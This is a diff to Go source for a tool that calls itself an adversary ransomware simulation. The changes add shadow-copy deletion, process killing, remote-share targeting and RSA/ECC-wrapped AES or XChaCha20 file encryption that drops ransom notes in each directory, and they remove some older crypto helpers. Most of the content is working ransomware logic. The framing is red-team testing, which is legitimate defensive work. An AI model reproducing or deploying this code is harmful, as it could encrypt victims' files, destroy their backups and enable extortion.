@@ -2,20 +2,15 @@ package main
 
 import (
 	"bufio"
-	"crypto/aes"
-	"crypto/cipher"
 	r "crypto/rand"
 	"crypto/rsa"
 	"crypto/sha1"
-	"crypto/x509"
-	"encoding/pem"
+	"embed"
 	"errors"
 	"flag"
 	"fmt"
 	"github.com/abakum/embed-encrypt/encryptedfs"
-	"golang.org/x/crypto/chacha20"
 	"gopkg.in/yaml.v3"
-	"hash"
 	"io"
 	"math/rand"
 	"os"
@@ -178,6 +173,7 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 func main() {
 	printFormattedMessage("impact - Adversary Ransomware Simulation", INFO)
 	printFormattedMessage("For Questions or Issues: github.com/joeavanzato/impact", INFO)
+
 	config, err := ReadConfig()
 	if err != nil {
 		printFormattedMessage(err.Error(), ERROR)
@@ -188,6 +184,26 @@ func main() {
 		printFormattedMessage(err.Error(), ERROR)
 		return
 	}
+
+	asymKeys := AsymKeyHandler{
+		RSAPublicKey:      nil,
+		RSAPublicKeyFile:  "",
+		RSAPrivateKey:     nil,
+		RSAPrivateKeyFile: "",
+		ECCPublicKey:      nil,
+		ECCPublicKeyFile:  "",
+		ECCPrivateKey:     nil,
+		ECCPrivateKeyFile: "",
+		System:            "",
+	}
+	if args["generate_keys"].(bool) {
+		asymKeys, err = generateKeys()
+		if err != nil {
+			printFormattedMessage(err.Error(), ERROR)
+		}
+		return
+	}
+
 	group := args["group"].(RansomActor)
 	target_dir := args["target"].(string)
 	if args["list"].(bool) {
@@ -206,11 +222,35 @@ func main() {
 		}
 		return
 	}
+
+	// Check if local or remote target and get hostname if remote
 	printFormattedMessage(fmt.Sprintf("Checking Target Directory: %s", target_dir), INFO)
 	err = doesOSEntryExist(target_dir)
 	if err != nil {
 		printFormattedMessage(fmt.Sprintf("Target Directory Error: %s", err.Error()), INFO)
 		return
+	}
+	isRemoteDevice := false
+	if strings.HasPrefix(target_dir, "\\\\") {
+		isRemoteDevice = true
+	}
+
+	// Delete VSS Copies on target
+	if args["vss"].(bool) {
+		err = RemoveShadowCopies(isRemoteDevice)
+		if err != nil {
+			// Non-fatal so we will continue
+			printFormattedMessage(fmt.Sprintf("Process Kill Error: %s", err.Error()), ERROR)
+		}
+	}
+
+	// Kill processes on target
+	if args["killprocs"].(bool) {
+		err = KillTargetProcesses(config.ProcessKillNames, isRemoteDevice, "")
+		if err != nil {
+			// Non-fatal so we will continue
+			printFormattedMessage(fmt.Sprintf("Process Kill Error: %s", err.Error()), ERROR)
+		}
 	}
 
 	// Need to create files now if performing
@@ -245,6 +285,7 @@ func main() {
 			return
 		}
 	}
+	decryptEnabled := args["decrypt"].(bool)
 
 	// validate supplied cipher or group read
 	sym_cipher := ""
@@ -254,8 +295,61 @@ func main() {
 		sym_cipher = strings.ToLower(group.Cipher)
 	}
 
-	allowed_ciphers := []string{"xchacha20", "aes256"}
-	if !slices.Contains(allowed_ciphers, sym_cipher) {
+	asym_cipher := strings.ToLower(group.AsymCipher)
+
+	// validate supplied asymmetric cipher or group read
+	if decryptEnabled {
+		// Are we supplying an override cipher in arguments?
+		if args["rsa_private"].(string) != "" {
+			asymKeys.RSAPrivateKey, err = getPrivateRSAKeyFromFile(args["rsa_public"].(string))
+			if err != nil {
+				printFormattedMessage(fmt.Sprintf("Error getting RSA Private key from specified file: %s", err.Error()), ERROR)
+				return
+			}
+			asymKeys.System = "rsa"
+		} else if args["ecc_private"].(string) != "" {
+			asymKeys.ECCPrivateKey, err = getPrivateECCKeyFromFile(args["ecc_private"].(string))
+			if err != nil {
+				printFormattedMessage(fmt.Sprintf("Error getting ECC Private key from specified file: %s", err.Error()), ERROR)
+				return
+			}
+			asymKeys.System = "ecc"
+		} else {
+			// Should never hit this branch as we MUST supply a private key when decrypting
+			printFormattedMessage("No private key supplied!", ERROR)
+			return
+		}
+	} else {
+		// Encryption - same checks but in reverse
+		if args["rsa_public"].(string) != "" {
+			asymKeys.RSAPublicKey, err = getPublicRSAKeyFromFile(args["rsa_public"].(string))
+			if err != nil {
+				printFormattedMessage(fmt.Sprintf("Error getting RSA Public key from specified file: %s", err.Error()), ERROR)
+				return
+			}
+			asymKeys.System = "rsa"
+		} else if args["ecc_public"].(string) != "" {
+			asymKeys.ECCPublicKey, err = getPublicECCKeyFromFile(args["ecc_public"].(string))
+			if err != nil {
+				printFormattedMessage(fmt.Sprintf("Error getting ECC Public key from specified file: %s", err.Error()), ERROR)
+				return
+			}
+			asymKeys.System = "ecc"
+		} else {
+			// We will use the groups default
+			asymKeys.System = asym_cipher
+			// TODO - Extract the relevant key from our embedded file system
+		}
+	}
+	allowed_asym_ciphers := []string{"rsa", "ecc"}
+	if !slices.Contains(allowed_asym_ciphers, asym_cipher) {
+		printFormattedMessage(fmt.Sprintf("Asymmetric Cipher not implemented: %s", asym_cipher), ERROR)
+		return
+	}
+	asymKeys.System = asym_cipher
+
+	allowed_symmetric_ciphers := []string{"xchacha20", "aes256"}
+	if !slices.Contains(allowed_symmetric_ciphers, sym_cipher) {
 		printFormattedMessage(fmt.Sprintf("Cipher not implemented: %s", sym_cipher), ERROR)
 		return
 	}
@@ -264,161 +358,17 @@ func main() {
 	var ewg sync.WaitGroup
 	fileTargetChannel := make(chan File)
 
-	var rsaPrivateKey *rsa.PrivateKey
-	var rsaPublicKey *rsa.PublicKey
-	if args["decrypt"].(bool) {
-		// User is decrypting data - thus, must supply an RSA private key
-		rsaPrivateKey, err = getPrivateKeyFromFile(args["rsa_private"].(string))
-		if err != nil {
-			printFormattedMessage(fmt.Sprintf("Error reading supplied RSA Private Key: %s", err.Error()), ERROR)
-			return
-		}
-	} else if args["rsa_public"].(string) != "" {
-		// User is supplying public key to use for encryption
-		rsaPublicKey, err = getPublicKeyFromFile(args["rsa_public"].(string))
-		if err != nil {
-			printFormattedMessage(fmt.Sprintf("Error reading supplied RSA Public Key: %s", err.Error()), ERROR)
-			return
-		}
-		generateDecryptInstructions(target_dir, "{PRIVATE KEY FILE}", sym_cipher, args["recursive"].(bool))
-	} else {
-		// We are NOT decrypting and NOT using a known public key - so we generate them now and get the keys
-		publicKeyFile, privateKeyFile := generateRSA()
-		rsaPublicKey, err = getPublicKeyFromFile(publicKeyFile)
-		if err != nil {
-			printFormattedMessage(fmt.Sprintf("Error reading RSA Public Key: %s", err.Error()), ERROR)
-			return
-		}
-		generateDecryptInstructions(target_dir, privateKeyFile, sym_cipher, args["recursive"].(bool))
-		// We will use private key to generate decryption command for user,
-	}
+	recursiveBool := args["recursive"].(bool)
+
+	generateDecryptInstructions(target_dir, asymKeys, sym_cipher, recursiveBool)
 
 	// ewg is closed once all workers are finished encrypting, fileTargetChannel is closed once all files have been pushed to the channel
 	for i := 0; i < args["workers"].(int); i++ {
 		ewg.Add(1)
-		go encryptionWorker(fileTargetChannel, &ewg, noteName, method, sym_cipher, extension, rsaPublicKey, rsaPrivateKey, args["decrypt"].(bool), group)
+		go encryptionWorker(fileTargetChannel, &ewg, noteName, method, sym_cipher, extension, asymKeys, decryptEnabled, group)
 	}
-
-	doEncryption(target_dir, note, noteName, args["recursive"].(bool), fileList, fileTargetChannel, args["decrypt"].(bool))
+	findFileTargets(target_dir, note, noteName, recursiveBool, fileList, fileTargetChannel, args["decrypt"].(bool))
 	ewg.Wait()
-}
-
-func generateDecryptInstructions(targetDir string, privateKeyFile string, cipher string, recurse bool) {
-	decryptionCommand := fmt.Sprintf("impact -directory %s -skipconfirm -rsa_private %s -cipher %s -decrypt", targetDir, privateKeyFile, cipher)
-	if recurse {
-		decryptionCommand += " -recursive"
-	}
-	f, err := os.Create("decryption_command.txt")
-	defer f.Close()
-	if err != nil {
-		printFormattedMessage(fmt.Sprintf("Error opening decryption command file: %s", err.Error()), ERROR)
-		return
-	}
-	f.WriteString(decryptionCommand)
-}
-
-func getPublicKeyFromFile(file string) (*rsa.PublicKey, error) {
-	pubKeyData, err := os.ReadFile(file)
-	if err != nil {
-		return nil, fmt.Errorf("Failed to read public key file: %v", err)
-	}
-	// Decode the PEM data
-	block, _ := pem.Decode(pubKeyData)
-	if block == nil || block.Type != "RSA PUBLIC KEY" {
-		return nil, fmt.Errorf("Failed to decode PEM block containing public key")
-	}
-
-	// Parse the public key
-	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
-	if err != nil {
-		return nil, fmt.Errorf("Failed to parse public key: %v", err)
-	}
-	return pub, nil
-}
-
-func getPrivateKeyFromFile(file string) (*rsa.PrivateKey, error) {
-	keyData, err := os.ReadFile(file)
-	if err != nil {
-		return nil, fmt.Errorf("Failed to read private key file: %v", err)
-	}
-	// Decode the PEM data
-	block, _ := pem.Decode(keyData)
-	if block == nil || block.Type != "RSA PRIVATE KEY" {
-		return nil, fmt.Errorf("Failed to decode PEM block containing private key")
-	}
-	// Parse the public key
-	pri, err := x509.ParsePKCS1PrivateKey(block.Bytes)
-	if err != nil {
-		return nil, fmt.Errorf("Failed to parse private key: %v", err)
-	}
-	return pri, nil
-}
-
-func generateRSA() (string, string) {
-
-	filename := "rsa_key"
-	bitSize := 4096
-
-	rsakey, err := rsa.GenerateKey(r.Reader, bitSize)
-	if err != nil {
-		panic(err)
-	}
-	pub := rsakey.Public()
-
-	// Encode private key to PKCS#1 ASN.1 PEM.
-	keyPEM := pem.EncodeToMemory(
-		&pem.Block{
-			Type:  "RSA PRIVATE KEY",
-			Bytes: x509.MarshalPKCS1PrivateKey(rsakey),
-		},
-	)
-
-	// Encode public key to PKCS#1 ASN.1 PEM.
-	pubPEM := pem.EncodeToMemory(
-		&pem.Block{
-			Type:  "RSA PUBLIC KEY",
-			Bytes: x509.MarshalPKCS1PublicKey(pub.(*rsa.PublicKey)),
-		},
-	)
-
-	// Typically, this is the key attacker would retain control of to generate decryptor
-	if err := os.WriteFile(filename+".rsa", keyPEM, 0700); err != nil {
-		panic(err)
-	}
-
-	if err := os.WriteFile(filename+".rsa.pub", pubPEM, 0755); err != nil {
-		panic(err)
-	}
-	return filename + ".rsa.pub", filename + ".rsa"
-}
-
-func encryptionWorker(c chan File, ewg *sync.WaitGroup, noteName string, method string, cipher string, extension string, publicKey *rsa.PublicKey, privateKey *rsa.PrivateKey, decrypt bool, group RansomActor) {
-	// Receives files to encrypt
-	defer ewg.Done()
-	for {
-		file, ok := <-c
-		if !ok {
-			break
-		} else {
-			if filepath.Base(file.Path) == noteName {
-				continue
-			}
-			if decrypt {
-				if cipher == "xchacha20" {
-					decryptFileXChaCha20(file, cipher, privateKey, group)
-				} else if cipher == "aes256" {
-					decryptFileAES256(file, privateKey, group)
-				}
-			} else {
-				if cipher == "xchacha20" {
-					encryptFileXChaCha20(file, method, extension, publicKey)
-				} else if cipher == "aes256" {
-					encryptFileAES256(file, method, extension, publicKey)
-				}
-			}
-		}
-	}
-
 }
 
 func encryptFileAES256(file File, method string, extension string, publicKey *rsa.PublicKey) {
@@ -761,64 +711,6 @@ func decryptFileXChaCha20(file File, cipher string, privateKey *rsa.PrivateKey, 
 
 }
 
-func removeLastExtension(filename string) string {
-	ext := filepath.Ext(filename)
-	if ext != "" {
-		return strings.TrimSuffix(filename, ext)
-	}
-	return filename
-}
-
-func getXChaCha20Cipher(sym_key []byte, nonce []byte) (*chacha20.Cipher, []byte) {
-	if sym_key == nil {
-		sym_key = make([]byte, 32)
-		if _, err := io.ReadFull(r.Reader, sym_key); err != nil {
-			panic(err)
-		}
-	}
-	if nonce == nil {
-		// 192-bit nonce (24 bytes) for XChaCha20
-		nonce = make([]byte, 24)
-		if _, err := io.ReadFull(r.Reader, nonce); err != nil {
-			panic(err)
-		}
-	}
-	c, err := chacha20.NewUnauthenticatedCipher(sym_key, nonce)
-	if err != nil {
-		panic(err)
-	}
-	emeddedData := make([]byte, 0)
-	emeddedData = append(emeddedData, sym_key...)
-	emeddedData = append(emeddedData, nonce...)
-	return c, emeddedData
-}
-
-func getAES256Cipher(sym_key []byte, nonce []byte) (cipher.Stream, []byte) {
-
-	if sym_key == nil {
-		sym_key = make([]byte, 32)
-		if _, err := io.ReadFull(r.Reader, sym_key); err != nil {
-			panic(err)
-		}
-	}
-	if nonce == nil {
-		nonce = make([]byte, 16)
-		if _, err := io.ReadFull(r.Reader, nonce); err != nil {
-			panic(err)
-		}
-	}
-
-	block, err := aes.NewCipher(sym_key)
-	if err != nil {
-		panic(err.Error())
-	}
-	aesCTR := cipher.NewCTR(block, nonce)
-	emeddedData := make([]byte, 0)
-	emeddedData = append(emeddedData, sym_key...)
-	emeddedData = append(emeddedData, nonce...)
-	return aesCTR, emeddedData
-}
-
 func encryptFileXChaCha20(file File, method string, extension string, publicKey *rsa.PublicKey) {
 	// ENCRYPTION PROCESS
 	// The key is stored in memory and when encryption is completed, it is RSA encrypted and appended to the end of the file
@@ -931,53 +823,7 @@ func encryptFileXChaCha20(file File, method string, extension string, publicKey 
 
 }
 
-// https://stackoverflow.com/questions/62348923/rs256-message-too-long-for-rsa-public-key-size-error-signing-jwt?answertab=votes#tab-top
-func EncryptOAEP(hash hash.Hash, random io.Reader, public *rsa.PublicKey, msg []byte, label []byte) ([]byte, error) {
-	msgLen := len(msg)
-	step := public.Size() - 2*hash.Size() - 2
-	var encryptedBytes []byte
-
-	for start := 0; start < msgLen; start += step {
-		finish := start + step
-		if finish > msgLen {
-			finish = msgLen
-		}
-
-		encryptedBlockBytes, err := rsa.EncryptOAEP(hash, random, public, msg[start:finish], label)
-		if err != nil {
-			return nil, err
-		}
-
-		encryptedBytes = append(encryptedBytes, encryptedBlockBytes...)
-	}
-
-	return encryptedBytes, nil
-}
-
-// https://stackoverflow.com/questions/62348923/rs256-message-too-long-for-rsa-public-key-size-error-signing-jwt?answertab=votes#tab-top
-func DecryptOAEP(hash hash.Hash, random io.Reader, private *rsa.PrivateKey, msg []byte, label []byte) ([]byte, error) {
-	msgLen := len(msg)
-	step := private.PublicKey.Size()
-	var decryptedBytes []byte
-
-	for start := 0; start < msgLen; start += step {
-		finish := start + step
-		if finish > msgLen {
-			finish = msgLen
-		}
-
-		decryptedBlockBytes, err := rsa.DecryptOAEP(hash, random, private, msg[start:finish], label)
-		if err != nil {
-			return nil, err
-		}
-
-		decryptedBytes = append(decryptedBytes, decryptedBlockBytes...)
-	}
-
-	return decryptedBytes, nil
-}
-
-func doEncryption(targetDir string, note string, noteName string, recursive bool, fileList []string, c chan File, decrypt bool) {
+func findFileTargets(targetDir string, note string, noteName string, recursive bool, fileList []string, c chan File, decrypt bool) {
 	// Each unique directory that we encounter, including base, should receive a ransomware note creation
 	// If len(fileList) == 0, we did NOT create files explicitly for this test and as such, will be flat-scanning or recursively iterating
 	// Flat scanning is easy - we can populate right now
@@ -1014,6 +860,7 @@ func doEncryption(targetDir string, note string, noteName string, recursive bool
 				if info.IsDir() {
 					return nil
 				}
+				fmt.Println(filepath.Ext(path))
 				baseDir := filepath.Dir(path)
 				if !slices.Contains(ransomwareNoteDirs, baseDir) && !decrypt {
 					createNote(note, noteName, baseDir)
